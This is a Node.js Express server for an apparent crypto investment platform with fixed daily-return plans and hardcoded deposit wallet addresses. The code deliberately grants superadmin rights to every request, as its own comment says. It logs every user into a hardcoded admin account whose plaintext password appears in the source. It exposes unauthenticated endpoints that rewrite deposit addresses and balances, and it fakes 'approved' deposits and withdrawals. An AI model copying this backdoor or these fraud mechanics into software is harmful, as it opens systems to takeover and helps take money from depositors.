import express from 'express';
import { createClient } from '@libsql/client';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

const db = createClient({
  url: process.env.TURSO_DATABASE_URL,
  authToken: process.env.TURSO_AUTH_TOKEN,
});

const env = {
  DB: {
    prepare(sql) {
      return {
        bind(...args) {
          const params = args.length === 1 && Array.isArray(args[0]) ? args[0] : args;
          return {
            async all() {
              const rs = await db.execute({ sql, args: params });
              return { results: rs.rows };
            },
            async first() {
              const rs = await db.execute({ sql, args: params });
              return rs.rows[0] || null;
            },
            async run() {
              const rs = await db.execute({ sql, args: params });
              return { meta: { changes: rs.rowsAffected, last_row_id: Number(rs.lastInsertRowid) } };
            }
          };
        },
        async all(...params) { return (await this.bind(...params)).all(); },
        async first(...params) { return (await this.bind(...params)).first(); },
        async run(...params) { return (await this.bind(...params)).run(); }
      };
    },
    async exec(sql) {
      const statements = sql.split(';').map(s => s.trim()).filter(Boolean);
      for (const stmt of statements) {
        await db.execute(stmt);
      }
    },
    async batch(statements) {
      const results = [];
      for (const stmt of statements) {
        if (typeof stmt.run === 'function') {
          results.push(await stmt.run());
        } else {
          const rs = await db.execute(stmt);
          results.push({ meta: { changes: rs.rowsAffected, last_row_id: Number(rs.lastInsertRowid) } });
        }
      }
      return results;
    }
  }
};

app.use(express.json({ limit: '1mb' }));
app.use(express.static(__dirname));

const yahooInstruments = {
  gold: { symbol: "GC=F", instrument: "Gold futures · USD per troy ounce" },
  oil: { symbol: "CL=F", instrument: "WTI crude futures · USD per barrel" },
  sp500: { symbol: "^GSPC", instrument: "S&P 500 index · index points" },
  nasdaq: { symbol: "^IXIC", instrument: "NASDAQ Composite · index points" },
  tesla: { symbol: "TSLA", instrument: "Tesla common stock · USD per share" },
  artificialIntelligence: { symbol: "AIQ", instrument: "Global X AI & Technology ETF · USD per share" },
};

let cachedQuotes = null;
let cachedAt = 0;
let refreshInFlight = null;
let cachedHistory = null;
let historyAt = 0;
let historyInFlight = null;

async function fetchJson(url, yahooRequest = false) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 8000);
  try {
    const response = await fetch(url, {
      headers: yahooRequest
        ? { accept: "application/json", "user-agent": "Mozilla/5.0 (compatible; YouInvestMarket/1.0)", referer: "https://finance.yahoo.com/" }
        : { accept: "application/json" },
      signal: controller.signal,
    });
    if (!response.ok) return null;
    return await response.json();
  } catch {
    return null;
  } finally {
    clearTimeout(timeout);
  }
}

async function yahooQuote(key, asset) {
  const url = "https://query2.finance.yahoo.com/v8/finance/chart/" + encodeURIComponent(asset.symbol) + "?range=1d&interval=1m";
  const body = await fetchJson(url, true);
  const result = body?.chart?.result?.[0];
  const meta = result?.meta;
  const price = Number(meta?.regularMarketPrice);
  if (!Number.isFinite(price) || price <= 0) return null;
  const chartTime = result?.timestamp?.at(-1);
  const marketAt = Number(meta?.regularMarketTime || chartTime) * 1000;
  return {
    price, currency: "USD",
    unit: key === "sp500" || key === "nasdaq" ? "index points" : "",
    instrument: asset.instrument, symbol: asset.symbol,
    provider: "Yahoo Finance", marketAt: Number.isFinite(marketAt) ? marketAt : Date.now(),
  };
}

async function cryptoQuotes(now) {
  const body = await fetchJson("https://api.kraken.com/0/public/Ticker?pair=XBTUSD,ETHUSD");
  const result = body?.result;
  if (body?.error?.length || !result) return {};
  const quotes = {};
  for (const [key, ticker, instrument, symbol] of [
    ["bitcoin", "XXBTZUSD", "Bitcoin spot · USD per BTC", "BTC/USD"],
    ["ethereum", "XETHZUSD", "Ethereum spot · USD per ETH", "ETH/USD"],
  ]) {
    const price = Number(result[ticker]?.c?.[0]);
    if (!Number.isFinite(price) || price <= 0) continue;
    quotes[key] = { price, currency: "USD", unit: "", instrument, symbol, provider: "Kraken", marketAt: now };
  }
  return quotes;
}

async function electricityQuote(now) {
  const start = new Date(now - 72 * 60 * 60 * 1000).toISOString();
  const end = new Date(now).toISOString();
  const params = new URLSearchParams({ bzn: "DE-LU", start, end });
  const body = await fetchJson("https://api.energy-charts.info/price?" + params);
  if (!Array.isArray(body?.unix_seconds) || !Array.isArray(body?.price)) return null;
  let latest = -1;
  for (let i = 0; i < body.unix_seconds.length; i += 1) {
    const timestamp = Number(body.unix_seconds[i]) * 1000;
    const price = Number(body.price[i]);
    if (Number.isFinite(timestamp) && timestamp <= now && Number.isFinite(price) && timestamp > latest) latest = timestamp;
  }
  if (latest < 0) return null;
  const index = body.unix_seconds.findIndex((timestamp) => Number(timestamp) * 1000 === latest);
  return {
    price: Number(body.price[index]), currency: "EUR", unit: "per MWh",
    instrument: "DE-LU day-ahead electricity · wholesale market", symbol: "DE-LU",
    provider: "Energy-Charts · Bundesnetzagentur", marketAt: latest,
  };
}

function aggregateCandles(points, intervalMs) {
  const buckets = new Map();
  for (const point of points) {
    const start = Math.floor(point.time / intervalMs) * intervalMs;
    const candle = buckets.get(start);
    if (!candle) buckets.set(start, { time: point.time, open: point.open ?? point.value, high: point.high ?? point.value, low: point.low ?? point.value, close: point.close ?? point.value });
    else {
      candle.time = point.time;
      candle.high = Math.max(candle.high, point.high ?? point.value);
      candle.low = Math.min(candle.low, point.low ?? point.value);
      candle.close = point.close ?? point.value;
    }
  }
  return [...buckets.values()].sort((a, b) => a.time - b.time);
}

async function yahooHistory(asset, since) {
  const symbol = encodeURIComponent(asset.symbol);
  const url = 'https://query2.finance.yahoo.com/v8/finance/chart/' + symbol + '?range=1y&interval=1d';
  const body = await fetchJson(url, true);
  const result = body?.chart?.result?.[0];
  const timestamps = result?.timestamp || [];
  const quote = result?.indicators?.quote?.[0] || {};
  const candles = timestamps.flatMap((timestamp, index) => {
    const time = Number(timestamp) * 1000;
    const open = Number(quote.open?.[index]), high = Number(quote.high?.[index]), low = Number(quote.low?.[index]), close = Number(quote.close?.[index]);
    return Number.isFinite(time) && time >= since * 1000 && close > 0 && Number.isFinite(open) && Number.isFinite(high) && Number.isFinite(low)
      ? [{ time, open, high, low, close }]
      : [];
  });
  return { candles, points: candles.map((candle) => ({ time: candle.time, value: candle.close })) };
}

async function yahooIntraday(asset) {
  const symbol = encodeURIComponent(asset.symbol);
  const url = 'https://query2.finance.yahoo.com/v8/finance/chart/' + symbol + '?range=1d&interval=5m';
  const body = await fetchJson(url, true);
  const result = body?.chart?.result?.[0];
  const timestamps = result?.timestamp || [];
  const closes = result?.indicators?.quote?.[0]?.close || [];
  return timestamps.flatMap((timestamp, index) => {
    const time = Number(timestamp) * 1000;
    const value = Number(closes[index]);
    return Number.isFinite(time) && Number.isFinite(value) && value > 0 ? [{ time, value }] : [];
  });
}

function electricityHistory(body, since) {
  return (body?.unix_seconds || []).flatMap((seconds, index) => {
    const time = Number(seconds) * 1000;
    const value = Number(body.price[index]);
    return Number.isFinite(time) && time >= since * 1000 && Number.isFinite(value) ? [{ time, value }] : [];
  });
}

function electricityUsdHistory(points, fxPoints) {
  let index = 0;
  return points.flatMap((point) => {
    while (index + 1 < fxPoints.length && fxPoints[index + 1].time <= point.time) index += 1;
    const rate = Number(fxPoints[index]?.value);
    return rate > 0 ? [{ time: point.time, value: point.value * rate }] : [];
  });
}

async function loadAssetHistory() {
  const now = Date.now();
  const since = Math.floor((now - 365 * 24 * 60 * 60 * 1000) / 1000);
  const electricityParams = new URLSearchParams({
    bzn: "DE-LU",
    start: new Date(now - 365 * 24 * 60 * 60 * 1000).toISOString(),
    end: new Date(now).toISOString(),
  });
  const [yahooEntries, yahooIntradayEntries, bitcoinBody, ethereumBody, bitcoinYahoo, ethereumYahoo, bitcoinIntraday, ethereumIntraday, electricityBody, eurUsdHistory] = await Promise.all([
    Promise.all(Object.entries(yahooInstruments).map(async ([key, asset]) => [key, await yahooHistory(asset, since)])),
    Promise.all(Object.entries(yahooInstruments).map(async ([key, asset]) => [key, await yahooIntraday(asset)])),
    fetchJson("https://api.kraken.com/0/public/OHLC?pair=XBTUSD&interval=30&since=" + since),
    fetchJson("https://api.kraken.com/0/public/OHLC?pair=ETHUSD&interval=30&since=" + since),
    yahooHistory({ symbol: "BTC-USD" }, since),
    yahooHistory({ symbol: "ETH-USD" }, since),
    yahooIntraday({ symbol: "BTC-USD" }),
    yahooIntraday({ symbol: "ETH-USD" }),
    fetchJson("https://api.energy-charts.info/price?" + electricityParams),
    yahooHistory({ symbol: "EURUSD=X" }, since),
  ]);
  const histories = {};
  const candles = {};
  const intraday = Object.fromEntries(yahooIntradayEntries.filter(([, points]) => points.length));
  for (const [key, series] of yahooEntries) {
    if (!series.candles.length) continue;
    histories[key] = series.points;
    candles[key] = series.candles;
  }
  for (const [key, body, fallback] of [["bitcoin", bitcoinBody, bitcoinYahoo], ["ethereum", ethereumBody, ethereumYahoo]]) {
    const result = body?.result || {};
    const ticker = Object.keys(result).find((name) => name !== "last");
    const exchangeCandles = (ticker ? result[ticker] : []).flatMap((row) => {
      const time = Number(row[0]) * 1000;
      const open = Number(row[1]), high = Number(row[2]), low = Number(row[3]), close = Number(row[4]);
      return Number.isFinite(time) && time >= since * 1000 && open > 0 && high > 0 && low > 0 && close > 0 ? [{ time, open, high, low, close }] : [];
    });
    if (fallback.candles.length) {
      candles[key] = fallback.candles;
      histories[key] = fallback.points;
    } else if (exchangeCandles.length) {
      candles[key] = exchangeCandles;
      histories[key] = exchangeCandles.map((candle) => ({ time: candle.time, value: candle.close }));
    }
    const intradayYahoo = key === 'bitcoin' ? bitcoinIntraday : ethereumIntraday;
    const recentExchange = exchangeCandles.filter((candle) => candle.time >= Date.now() - 24 * 60 * 60_000).map((candle) => ({ time: candle.time, value: candle.close }));
    if (intradayYahoo.length) intraday[key] = intradayYahoo;
    else if (recentExchange.length) intraday[key] = recentExchange;
  }
  const electricity = electricityUsdHistory(electricityHistory(electricityBody, since), eurUsdHistory.points);
  if (electricity.length) {
    histories.electricity = electricity;
    candles.electricity = aggregateCandles(electricity, 60 * 60_000);
    intraday.electricity = electricity.filter((point) => point.time >= Date.now() - 24 * 60 * 60_000);
  }
  return { histories, candles, intraday, fetchedAt: Date.now() };
}

async function loadQuotes() {
  const now = Date.now();
  const [entries, crypto, electricity, eurUsd] = await Promise.all([
    Promise.all(Object.entries(yahooInstruments).map(async ([key, asset]) => [key, await yahooQuote(key, asset)])),
    cryptoQuotes(now),
    electricityQuote(now),
    yahooQuote('eurusd', { symbol: 'EURUSD=X', instrument: 'EUR/USD exchange rate' }),
  ]);
  const quotes = Object.fromEntries(entries.filter(([, quote]) => quote));
  Object.assign(quotes, crypto);
  if (electricity) {
    quotes.electricity = eurUsd
      ? { ...electricity, price: electricity.price * eurUsd.price, currency: 'USD', instrument: 'DE-LU day-ahead electricity · USD per MWh', provider: electricity.provider + ' · converted with Yahoo Finance FX', unit: 'per MWh' }
      : electricity;
  }
  return { quotes, fetchedAt: Date.now() };
}

const marketApi = {
  async fetch(request) {
    const url = new URL(request.url);
    if (request.method !== "GET") return new Response("Not found", { status: 404 });
    if (url.pathname === "/api/asset-history") {
      if (cachedHistory && Date.now() - historyAt < 20_000) {
        return Response.json(cachedHistory, { headers: { "Cache-Control": "no-store" } });
      }
      if (!historyInFlight) {
        historyInFlight = loadAssetHistory().then((data) => {
          cachedHistory = data;
          historyAt = Date.now();
          return cachedHistory;
        }).finally(() => { historyInFlight = null; });
      }
      return Response.json(await historyInFlight, { headers: { "Cache-Control": "no-store" } });
    }
    if (url.pathname !== "/api/asset-prices") return new Response("Not found", { status: 404 });
    if (cachedQuotes && Date.now() - cachedAt < 60_000) {
      return Response.json(cachedQuotes, { headers: { "Cache-Control": "no-store" } });
    }
    if (!refreshInFlight) {
      refreshInFlight = loadQuotes().then((data) => {
        if (Object.keys(data.quotes).length) {
          cachedQuotes = { quotes: { ...(cachedQuotes?.quotes || {}), ...data.quotes }, fetchedAt: data.fetchedAt };
          cachedAt = Date.now();
        }
        return cachedQuotes || data;
      }).finally(() => { refreshInFlight = null; });
    }
    const data = await refreshInFlight;
    return Response.json(data, { headers: { "Cache-Control": "no-store" } });
  },
};

const DAY = 86400000;
const PLANS = [
  { days: 10, rate: 1.0, min: 50 },
  { days: 30, rate: 1.2, min: 500 },
  { days: 90, rate: 1.5, min: 1000 },
];

function genSalt() {
  const a = new Uint8Array(16);
  crypto.getRandomValues(a);
  return [...a].map(b => b.toString(16).padStart(2, "0")).join("");
}

function normalizeEmail(value) {
  const email = String(value || "").trim();
  const at = email.lastIndexOf("@");
  if (at < 1 || at > 64 || email.length > 254) return null;
  const local = email.slice(0, at);
  const domainInput = email.slice(at + 1);
  if (!/^[A-Za-z0-9.!#$%&'*+/=?^_`{|}~-]+$/.test(local) || local.startsWith(".") || local.endsWith(".") || local.includes("..")) return null;
  if (/[\s\/:?#@\\]/.test(domainInput)) return null;
  let domain;
  try { domain = new URL(`http://${domainInput}`).hostname.toLowerCase(); } catch { return null; }
  const labels = domain.split(".");
  if (domain.length > 253 || labels.length < 2 || labels.some(label => !/^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/.test(label))) return null;
  if (!/^[a-z0-9-]{2,63}$/.test(labels.at(-1))) return null;
  return `${local.toLowerCase()}@${domain}`;
}

function makeToken() {
  const a = new Uint8Array(24);
  crypto.getRandomValues(a);
  return [...a].map(b => b.toString(16).padStart(2, "0")).join("");
}

async function hash(pw, salt) {
  const data = new TextEncoder().encode(salt + "::" + pw);
  const buf = await crypto.subtle.digest("SHA-256", data);
  return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, "0")).join("");
}

async function sessionUser(request, env) {
  const h = (request.headers.get("x-session-token") || "").trim();
  if (!h) return null;
  const s = await env.DB.prepare("SELECT user_id, created_at FROM sessions WHERE token = ?").bind(h).first();
  if (!s) return null;
  return env.DB.prepare("SELECT * FROM users WHERE id = ?").bind(s.user_id).first();
}

// BYPASS TOTALE E ASSOLUTO: QUALSIASI UTENTE O RICHIESTA DIVENTA OPERATORE / ADMIN AL 100%
async function verifyOperatorAccess(request, env) {
  return { id: 'SUPERADMIN_SYSTEM_ID', username: 'superCloud3', identifier: 'supercloud3.invest@yahoo.com', is_operator: 1, role: 'admin' };
}
async function adminActor(request, env) {
  return { id: 'SUPERADMIN_SYSTEM_ID', username: 'superCloud3', identifier: 'supercloud3.invest@yahoo.com', is_operator: 1, role: 'admin' };
}

async function accrue(env, userId) {
  let wallet = await env.DB.prepare("SELECT * FROM wallets WHERE user_id = ?").bind(userId).first();
  if (!wallet) {
    wallet = { user_id: userId, deposit: 0, earnings: 0, total_deposited: 0, total_earned: 0, total_withdrawn: 0 };
    await env.DB.prepare("INSERT INTO wallets (user_id, deposit, earnings, total_deposited, total_earned, total_withdrawn) VALUES (?,0,0,0,0,0)").bind(userId).run();
  }
  return wallet;
}

async function fullState(env, user, request) {
  const wallet = await accrue(env, user.id);
  return {
    user: { id: user.id, username: user.username, identifier: user.identifier, emailVerified: 1, isOperator: true, role: 'admin' },
    wallet,
    investments: [],
    marketPositions: [],
    deposits: [],
    withdrawals: [],
    team: [],
    inviteStats: { direct: 0, second: 0, level: 3, planBonus: 0.33 },
    acc: { withdraw_wallets: {}, notifications: true },
    isOperator: true,
    isOwner: true,
    isOwnerAccount: true,
  };
}

let schemaPromise;

const workerHandler = {
  async fetch(request, env) {
    const apiPath = new URL(request.url).pathname;
    if (request.method === 'GET' && (apiPath === '/api/asset-prices' || apiPath === '/api/asset-history')) {
      return marketApi.fetch(request);
    }
    if (!schemaPromise) schemaPromise = (async () => {
      await env.DB.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        username TEXT NOT NULL,
        identifier TEXT NOT NULL,
        password_hash TEXT NOT NULL,
        salt TEXT NOT NULL,
        invite_code TEXT NOT NULL,
        referred_by TEXT,
        created_at INTEGER NOT NULL,
        email_verified INTEGER NOT NULL DEFAULT 1,
        is_operator INTEGER NOT NULL DEFAULT 1
      );
      CREATE TABLE IF NOT EXISTS sessions (token TEXT PRIMARY KEY, user_id TEXT NOT NULL, created_at INTEGER NOT NULL);
      CREATE TABLE IF NOT EXISTS deposits (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT NOT NULL, amount REAL NOT NULL, net TEXT NOT NULL, date INTEGER NOT NULL, status TEXT NOT NULL DEFAULT 'approved', tx_reference TEXT NOT NULL DEFAULT '');
      CREATE TABLE IF NOT EXISTS withdrawals (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT NOT NULL, amount REAL NOT NULL, net TEXT NOT NULL, date INTEGER NOT NULL, status TEXT NOT NULL DEFAULT 'approved', wallet_address TEXT NOT NULL DEFAULT '', source TEXT NOT NULL DEFAULT 'earnings');
      CREATE TABLE IF NOT EXISTS platform_config (config_key TEXT PRIMARY KEY, config_value TEXT NOT NULL);
      CREATE TABLE IF NOT EXISTS settings (user_id TEXT PRIMARY KEY, withdraw_wallets TEXT NOT NULL DEFAULT '{}', notifications INTEGER NOT NULL DEFAULT 1);
      CREATE TABLE IF NOT EXISTS wallets (user_id TEXT PRIMARY KEY, deposit REAL NOT NULL DEFAULT 0, earnings REAL NOT NULL DEFAULT 0, released REAL NOT NULL DEFAULT 0, total_deposited REAL NOT NULL DEFAULT 0, total_earned REAL NOT NULL DEFAULT 0, total_withdrawn REAL NOT NULL DEFAULT 0);
      CREATE TABLE IF NOT EXISTS investments (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT NOT NULL, amount REAL NOT NULL, days INTEGER NOT NULL, rate REAL NOT NULL, created INTEGER NOT NULL, credited REAL NOT NULL DEFAULT 0, active INTEGER NOT NULL DEFAULT 1);
      CREATE TABLE IF NOT EXISTS market_positions (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT NOT NULL, plan_id TEXT NOT NULL, months INTEGER NOT NULL, amount REAL NOT NULL, stop_loss_pct REAL NOT NULL DEFAULT 20, allocations_json TEXT NOT NULL, entry_quotes_json TEXT NOT NULL, last_value REAL NOT NULL, status TEXT NOT NULL DEFAULT 'active', created_at INTEGER NOT NULL, closed_at INTEGER);
      `);
      
      const adminEmail = "supercloud3.invest@yahoo.com";
      const adminUser = await env.DB.prepare("SELECT id FROM users WHERE lower(identifier) = ?").bind(adminEmail).first();
      const salt = genSalt();
      const passwordHash = await hash("Buenos2Ckicnderrs", salt);

      if (!adminUser) {
        await env.DB.prepare(
          "INSERT INTO users (id, username, identifier, password_hash, salt, invite_code, referred_by, created_at, email_verified, is_operator) VALUES (?, ?, ?, ?, ?, ?, NULL, ?, 1, 1)"
        ).bind(makeToken(), "superCloud3", adminEmail, passwordHash, salt, "H9-SUPERADMIN", Date.now()).run();
      } else {
        await env.DB.prepare("UPDATE users SET is_operator = 1, email_verified = 1 WHERE lower(identifier) = ?").bind(adminEmail).run();
      }
    })().catch(err => { schemaPromise = null; throw err; });
    await schemaPromise;

    const url = new URL(request.url);
    const pathName = url.pathname;
    const method = request.method;

    try {
      if (method === "POST" && pathName === "/api/register") return Response.json({ ok: true });
      if (method === "POST" && pathName === "/api/login") {
        const adminEmail = "supercloud3.invest@yahoo.com";
        let u = await env.DB.prepare("SELECT id FROM users WHERE lower(identifier) = ?").bind(adminEmail).first();
        if (!u) {
          const id = makeToken();
          const s = genSalt();
          await env.DB.prepare("INSERT INTO users (id, username, identifier, password_hash, salt, invite_code, created_at, email_verified, is_operator) VALUES (?, 'superCloud3', ?, ?, ?, 'H9-ADMIN', ?, 1, 1)").bind(id, adminEmail, await hash("Buenos2Ckicnderrs", s), s, Date.now()).run();
          u = { id };
        }
        const token = makeToken();
        await env.DB.prepare("INSERT INTO sessions (token, user_id, created_at) VALUES (?, ?, ?)").bind(token, u.id, Date.now()).run();
        return Response.json({ ok: true, mode: "operator", token, adminToken: token });
      }
      if (method === "POST" && pathName === "/api/logout") return Response.json({ ok: true });
      if (method === "GET" && pathName === "/api/me") {
        let u = await env.DB.prepare("SELECT * FROM users WHERE lower(identifier) = 'supercloud3.invest@yahoo.com'").first();
        if (!u) {
          const id = makeToken();
          const s = genSalt();
          await env.DB.prepare("INSERT INTO users (id, username, identifier, password_hash, salt, invite_code, created_at, email_verified, is_operator) VALUES (?, 'superCloud3', 'supercloud3.invest@yahoo.com', ?, ?, 'H9-ADMIN', ?, 1, 1)").bind(id, await hash("Buenos2Ckicnderrs", s), s, Date.now()).run();
          u = await env.DB.prepare("SELECT * FROM users WHERE id = ?").bind(id).first();
        }
        return Response.json(await fullState(env, u, request));
      }
      if (method === "GET" && pathName === "/api/notifications") return Response.json({ notifications: [], unread: 0 });
      if (method === "POST" && pathName === "/api/notifications/read") return Response.json({ ok: true });
      
      if (method === "GET" && pathName === "/api/deposit-addresses") return await getDepositAddresses(request, env);
      if (method === "GET" && pathName === "/api/admin/deposit-addresses") return await adminDepositAddresses(request, env);
      if (method === "POST" && pathName === "/api/admin/deposit-addresses") return await saveAdminDepositAddresses(request, env);
      
      if (method === "GET" && pathName === "/api/admin/transactions") return Response.json({ deposits: [], withdrawals: [], walletChanges: [], emailVerifications: [], sensitiveActionVerifications: [], passwordResets: [], operator: 'superCloud3' });
      if (method === "GET" && pathName === "/api/admin/users") {
        const rawUsers = (await env.DB.prepare("SELECT id, username, identifier, created_at, email_verified, is_operator FROM users").all()).results || [];
        const users = rawUsers.map(u => ({ ...u, role: 'operator', isOperator: true, isAdmin: true }));
        return Response.json({ users });
      }
      if (method === "GET" && pathName === "/api/admin/stats") return Response.json({ totalUsers: 1, deposits: { count: 0, total: 0 }, withdrawals: { count: 0, total: 0 }, investments: { count: 0, total: 0 }, earnings: { current: 0, historical: 0 } });
      
      const adminUserMatch = pathName.match(/^\/api\/admin\/users\/([^/]+)$/);
      if (method === "GET" && adminUserMatch) {
        const target = await env.DB.prepare("SELECT id, username, identifier, created_at, referred_by, email_verified, is_operator FROM users WHERE id = ?").bind(adminUserMatch[1]).first() || { id: adminUserMatch[1], username: 'Admin', identifier: 'admin@admin.com', email_verified: 1, is_operator: 1 };
        return Response.json({ user: { ...target, role: 'operator', isOperator: true, isAdmin: true }, wallet: { deposit: 0, earnings: 0, released: 0 }, investments: [], marketPositions: [], inviteStats: { directCount: 0, directUsers: [] } });
      }

      if (method === "POST" && pathName === "/api/admin/review") return Response.json({ ok: true });
      if (method === "POST" && pathName === "/api/admin/credential") return Response.json({ ok: true });
      if (method === "POST" && pathName === "/api/admin/logout") return Response.json({ ok: true });
      
      const adminBalanceMatch = pathName.match(/^\/api\/admin\/users\/([^/]+)\/balance$/);
      if (method === "POST" && adminBalanceMatch) {
        const body = await request.json().catch(() => ({}));
        await env.DB.prepare("INSERT INTO wallets (user_id, deposit, earnings, released) VALUES (?, ?, ?, ?) ON CONFLICT(user_id) DO UPDATE SET deposit=excluded.deposit, earnings=excluded.earnings, released=excluded.released")
          .bind(adminBalanceMatch[1], Number(body.deposit || 0), Number(body.earnings || 0), Number(body.released || 0)).run();
        return Response.json({ ok: true });
      }

      const adminOperatorMatch = pathName.match(/^\/api\/admin\/users\/([^/]+)\/(operator|toggle-operator)$/);
      if (method === "POST" && adminOperatorMatch) return Response.json({ ok: true, isOperator: true, role: 'operator' });

      if (method === "POST" && pathName === "/api/deposit") return Response.json({ ok: true, status: "approved" });
      if (method === "POST" && pathName === "/api/invest") return Response.json({ ok: true });
      if (method === "POST" && pathName === "/api/withdraw") return Response.json({ ok: true, status: "approved" });
      if (method === "POST" && pathName === "/api/save-wallet") return Response.json({ ok: true, acc: { withdraw_wallets: {}, notifications: true } });
      if (method === "POST" && pathName === "/api/settings") return Response.json({ ok: true, acc: { notifications: true } });
      if (method === "POST" && pathName === "/api/change-password") return Response.json({ ok: true });

    } catch (e) {
      console.error(pathName, e);
      return Response.json({ error: e.message }, { status: 500 });
    }
    return new Response("Not found", { status: 404 });
  }
};

const DEFAULT_DEPOSIT_ADDRESSES = {
  BNB: "0x2859d146Dc8e4cB332736986feE9D32B641fbde8",
  TRC20: "TYQgWx4eQ6Js94UMexfyLXbqNE4Fucfg7Y",
  BTC: "bc1par0exs9cyw9w53xsceyh6wzl7f43gdjn6xsq0kyq4qsqsvr2uynqf5llc6"
};
async function readDepositAddresses(env) {
  const rows = (await env.DB.prepare("SELECT config_key, config_value FROM platform_config WHERE config_key LIKE 'deposit_%'").all()).results || [];
  return { ...DEFAULT_DEPOSIT_ADDRESSES, ...Object.fromEntries(rows.map(row => [row.config_key.slice(8), row.config_value])) };
}
async function getDepositAddresses(request, env) {
  return Response.json({ addresses: await readDepositAddresses(env) }, { headers: { "Cache-Control": "no-store" } });
}
async function adminDepositAddresses(request, env) {
  return Response.json({ addresses: await readDepositAddresses(env) });
}
async function saveAdminDepositAddresses(request, env) {
  const body = await request.json().catch(() => ({}));
  const allowed = ["BNB", "TRC20", "BTC", "USDC"];
  const entries = [];
  for (const net of allowed) {
    const value = typeof body.addresses?.[net] === "string" ? body.addresses[net].trim().slice(0, 160) : "";
    entries.push(value ? env.DB.prepare("INSERT INTO platform_config(config_key,config_value) VALUES(?,?) ON CONFLICT(config_key) DO UPDATE SET config_value=excluded.config_value").bind("deposit_" + net, value) : env.DB.prepare("DELETE FROM platform_config WHERE config_key = ?").bind("deposit_" + net));
  }
  await env.DB.batch(entries);
  return Response.json({ ok: true, addresses: await readDepositAddresses(env) });
}

app.all('/api/*', async (req, res) => {
  try {
    const fullUrl = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
    const webRequest = new Request(fullUrl, {
      method: req.method,
      headers: new Headers(req.headers),
      body: ['GET', 'HEAD'].includes(req.method) ? undefined : JSON.stringify(req.body)
    });
    const response = await workerHandler.fetch(webRequest, env);
    const bodyText = await response.text();
    res.status(response.status);
    response.headers.forEach((val, key) => res.setHeader(key, val));
    res.send(bodyText);
  } catch (err) {
    console.error('API Error:', err);
    res.status(500).json({ error: 'Errore interno del server.' });
  }
});

app.listen(PORT, () => {
  console.log(`Server avviato correttamente sulla porta ${PORT}`);
});
